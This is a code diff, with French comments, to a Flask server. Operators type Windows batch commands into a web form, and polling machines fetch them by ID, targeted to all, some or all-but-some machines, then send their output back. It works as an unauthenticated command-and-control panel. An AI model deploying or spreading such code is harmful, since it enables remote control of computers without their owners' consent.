@@ -4,6 +4,7 @@ app = Flask(__name__)
 
 commande = ""
 resultat_commande = ""
+destinataires = ""
 
 html_formulaire = """
 <!DOCTYPE html>
@@ -13,9 +14,13 @@ html_formulaire = """
     <h2>Entrer une commande Batch</h2>
     <form action="/" method="POST">
         <input type="text" name="commande" placeholder="Commande batch">
+        <br>
+        <label for="destinataires">Destinataires (séparés par des virgules, '*' pour tous, '!id' pour exclure):</label>
+        <input type="text" name="destinataires" placeholder="* ou ID1,ID2,...">
         <button type="submit">Envoyer</button>
     </form>
     <p>Dernière commande soumise : {{ commande }}</p>
+    <p>Destinataires : {{ destinataires }}</p>
     <h3>Résultat de la commande :</h3>
     <pre>{{ resultat_commande }}</pre>
 </body>
@@ -24,19 +29,40 @@ html_formulaire = """
 
 @app.route("/", methods=["GET", "POST"])
 def index():
-    global commande
+    global commande, destinataires
     if request.method == "POST":
         commande = request.form.get("commande", "").strip()
-    return render_template_string(html_formulaire, commande=commande, resultat_commande=resultat_commande)
+        destinataires = request.form.get("destinataires", "").strip()
+    return render_template_string(html_formulaire, commande=commande, destinataires=destinataires, resultat_commande=resultat_commande)
 
 @app.route("/get_commande")
 def get_commande():
-    return commande
+    global destinataires, commande
+
+    machine_id = request.args.get('id')
+    if not machine_id:
+        return "", 400
+
+    # Gestion des destinataires
+    if destinataires == "*":
+        return commande  # Pour tous les ordinateurs
+    elif destinataires.startswith("!"):
+        exclusion_ids = [id.strip() for id in destinataires[1:].split(",")]
+        if machine_id not in exclusion_ids:
+            return commande
+    else:
+        inclusion_ids = [id.strip() for id in destinataires.split(",")]
+        if machine_id in inclusion_ids:
+            return commande
+    
+    return ""  # Ne rien envoyer si non ciblé
 
 @app.route("/post_resultat", methods=["POST"])
 def post_resultat():
     global resultat_commande
-    resultat_commande = request.form.get("resultat", "").strip()
+    machine_id = request.form.get("id", "").strip()
+    resultat = request.form.get("resultat", "").strip()
+    resultat_commande += f"\n[{machine_id}]\n{resultat}\n"
     return "Résultat reçu", 200
 
 if __name__ == "__main__":
